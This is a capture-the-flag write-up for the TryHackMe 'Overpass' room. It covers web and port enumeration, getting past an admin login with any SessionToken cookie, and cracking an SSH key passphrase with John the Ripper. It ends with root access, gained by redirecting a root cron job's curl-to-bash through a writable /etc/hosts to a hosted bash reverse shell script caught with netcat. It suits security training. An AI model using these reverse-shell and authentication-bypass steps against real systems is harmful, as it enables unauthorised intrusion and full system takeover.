# Overpass
https://tryhackme.com/room/overpass

After spinning up the room, investigating shows a basic website for downloading some utilities.
Definitely some fun commented banter hidden in the html to look at.

## Setup
For the console half of things, my workflow is to export the IP of the machine I am working with to the $ip envoronment variable, my local to $local, and then start up tmux.
(If you like multitasking in a single console window and feeling like a 1337 h4x0r - tmux is too much fun, check out https://tryhackme.com/room/rptmux)
```
export ip={overpass's machine ip}
export local={my ip relative to the vpn}
tmux
```

## Information Gathering
We have a website to play with, so while I poke around in my browser, I spin up gobuster in the background to see if anything interesting turns up.
```
root@4106f9d82986:/# gobuster --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u $ip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url: http://{overpass's machine ip}
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster/3.0.1
[+] Timeout: 10s
===============================================================
2020/07/20 23:52:57 Starting gobuster
===============================================================
/img (Status: 301)
/downloads (Status: 301)
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/http%3A%2F%2Fwww (Status: 301)
/http%3A%2F%2Fyoutube (Status: 301)
/http%3A%2F%2Fblogs (Status: 301)
/http%3A%2F%2Fblog (Status: 301)
/**http%3A%2F%2Fwww (Status: 301)
```
Most of what it finds are artifacts, but the important find is the /admin route.

I also spun up nmap to scan the machine.
```
root@4106f9d82986:/# nmap -sC -sV -T4 -v -o nmap.log $ip
...
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
| 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_ 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
nmap only tells us that we have an ssh server and an http server, powered by golang.

Loading the admin page gives me a login screen, and on submitting a test username and password I can see that it made a call to /api/login.
After poking this a bit I rule out sqlinjection as an attack vector.

Submitting the login request didn't reload the page though, so now to read through javascript.
Page source tells me there is a /login.js file to investigate.
There is a nice little section about dealing with the login attempt:
```
async function login() {
 const usernameBox = document.querySelector("#username");
 const passwordBox = document.querySelector("#password");
 const loginStatus = document.querySelector("#loginStatus");
 loginStatus.textContent = ""
 const creds = { username: usernameBox.value, password: passwordBox.value }
 const response = await postData("/api/login", creds)
 const statusOrCookie = await response.text()
 if (statusOrCookie === "Incorrect credentials") {
 loginStatus.textContent = "Incorrect Credentials"
 passwordBox.value=""
 } else {
 Cookies.set("SessionToken",statusOrCookie)
 window.location = "/admin"
 }
}
```
Reading that, I can see that if the server returned with something other than "Incorrect Credentials", it sets a cookie and rediercts to the admin page. Hmm.. maybe it doesn't actually care what that cookie is! I try loading the admin page with a that "SessionToken" cookie set.
```
curl -L -b "SessionToken=letmein" $ip/admin/
```
Interesting - looks like the server doesn't actually care what's in that cookie, just that it exists!
This page loads up an ssh private key. I save it to a file.

## Attempting User Access
After moving the key into my VM's `~/.ssh/id_rsa` file and changing the permissions to 600 (`chmod 600 ~/.ssh/id_rsa`) I try logging in to the server through ssh.
```
root@4106f9d82986:~# ssh james@$ip
Enter passphrase for key '/root/.ssh/id_rsa':
```
Well, looks like there is a passphrase to deal with. No biggie - the admin webpage did mention cracking it. To JohnTheRipper!

## Cracking Passphrase
First we need to convert the id_rsa into a hash that john likes. There is a utility ssh2john that does this for us, but my vm didn't have that, so I grabbed the johntheripper repo from github.
```
git clone https://github.com/magnumripper/JohnTheRipper
```
Now I have the python script I need.
```
chmod 666 ~/.ssh/id_rsa
python JohnTheRipper/run/ssh2john.py ~/.ssh/id_rsa > id_rsa.hash
chmod 600 ~/.ssh/id_rsa
```
Now that we've got a nice hash to use, let's get cracking
```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
Alright now we've got the passphrase!

## Capturing User Flag
We ssh again, now armed with out passphrase.
```
root@4106f9d82986:~# ssh james@$ip
Enter passphrase for key '/root/.ssh/id_rsa':

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation: https://help.ubuntu.com
 * Management: https://landscape.canonical.com
 * Support: https://ubuntu.com/advantage

 System information as of Tue Jul 21 22:46:07 UTC 2020

 System load: 0.0 Processes: 88
 Usage of /: 22.9% of 18.57GB Users logged in: 0
 Memory usage: 15% IP address for eth0: 10.10.148.232
 Swap usage: 0%


47 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
Last login: Tue Jul 21 22:20:53 2020 from 10.1.69.107

james@overpass-prod:~$ whoami
james
james@overpass-prod:~$ ls
todo.txt user.txt
```
Woot - Flag Captured!

## Enumerating
### crontab
one thing was interesting about crontab for the system:
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
It is set to make a curl to download a buildscript, and then running that as root. If I can inject my own bash script here, I can easily get a root reverse shell.
Looks like it's accessing a URL, overpass.thm. If I can edit /etc/hosts, then I can make that url point to my attacker server!
```
james@overpass-prod:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jul 21 23:18 /etc/hosts
```
Yup, my user can edit that! So all I need to do is write a bash reverse shell script, name it properly, host it, and then wait for the connection.

## Exploiting
### reverse shell script
Back on my attacker machine, I set up a directory structure like they have:
```
cd ~
mkdir -p www/downloads/src
```
Then I create a "buildscript.sh" in this folder
```
#!/bin/bash
bash -i >& /dev/tcp/{My Machine's IP}/4444 0>&1
```

### hosting attack script
Using Python to keep this simple.
```
root@4106f9d82986:~# cd ~/www
root@4106f9d82986:~/www# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

then in another console: (or tmux pane for the cool kids)
### netcat listener
```
root@4106f9d82986:~# nc -lvnp 4444
listening on [any] 4444 ...
```

### manipulating /etc/hosts
Logging back on as James, I edit /etc/hosts
```
vi /etc/hosts
```
I see the items in the host file:
```
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.1.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now I only have to replace the IP for overpass.thm with my attacker machine IP, and save

Now it's only a matter of waiting for a minute for the cron job to catch the script, you will see the python server display a message that there was a connection:
```
{victim IP} - - [21/Jul/2020 01:21:13] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

And momentarily later, the netcat listener perks up:
```
connect to [{My Machine's IP}] from (UNKNOWN) [{victim IP}] 60972
bash: cannot set terminal process group (22324): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# whoami
root
```
We have root!

## Capturing root
Now with our root user, we just have to scoop up the flag.
```
root@overpass-prod:~# cat /root/root.txt
```

